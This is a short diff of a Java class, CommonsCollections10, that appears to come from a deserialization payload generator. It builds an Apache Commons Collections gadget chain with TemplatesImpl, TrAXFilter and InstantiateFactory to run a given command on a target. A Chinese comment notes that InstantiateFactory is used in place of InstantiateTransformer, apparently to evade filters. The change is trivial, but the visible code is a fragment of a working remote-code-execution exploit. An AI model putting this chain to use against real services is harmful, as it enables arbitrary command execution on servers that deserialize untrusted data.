@@ -12,7 +12,6 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import javax.xml.transform.Templates;
-import java.lang.reflect.Constructor;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -22,6 +21,7 @@ public class CommonsCollections10 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         final Object templates;
+
         templates = Gadgets.createTemplatesImpl(command);
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
